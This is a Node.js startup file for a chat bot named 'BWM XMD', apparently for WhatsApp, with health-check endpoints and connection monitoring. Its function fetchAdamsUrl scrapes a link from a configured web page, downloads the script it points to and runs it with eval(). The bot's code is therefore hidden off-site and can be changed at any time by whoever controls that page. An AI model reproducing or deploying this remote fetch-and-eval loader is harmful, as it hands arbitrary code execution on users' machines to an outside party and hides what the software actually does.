//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//




const axios = require('axios');
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 8080;
const http = require('http');
const express = require('express');
const app = express();

// Health check endpoints for scale-to-zero
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

// Ready check for scale-to-zero
app.get('/ready', (req, res) => {
  if (global.xmd && global.xmd.user) {
    res.status(200).json({ ready: true });
  } else {
    res.status(503).json({ ready: false });
  }
});
const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Enhanced connection monitoring system
let connectionRetries = 0;
const maxRetries = 10;
let isConnected = false;

const checkConnection = async () => {
  try {
    if (global.xmd && global.xmd.user && global.xmd.ws.readyState === global.xmd.ws.OPEN) {
      if (!isConnected) {
        console.log("╭────────────━⊷\n║ʙᴡᴍ xᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ\n╰────────────━⊷");
        isConnected = true;
      }
      connectionRetries = 0;
    } else {
      isConnected = false;
      connectionRetries++;
      
      if (connectionRetries >= maxRetries) {
        console.log("Attempting to re-establish connection...");
        try {
          if (global.xmd) {
            await global.xmd.logout();
            await global.xmd.connect();
          }
        } catch (reconnectError) {
          console.error("Reconnection failed:", reconnectError);
        }
        connectionRetries = 0;
      }
    }
  } catch (error) {
    console.error("Connection monitor error:", error);
  }
};

// Check connection status every 15 seconds
setInterval(checkConnection, 15000);

// Handle unexpected disconnections
global.xmd?.ws?.on('close', () => {
  isConnected = false;
  console.log("Connection closed, monitoring for reconnection...");
});

// Keep-alive ping every 2 minutes
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    global.xmd.sendPresenceUpdate('available');
  }
}, 120000);

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

fetchAdamsUrl();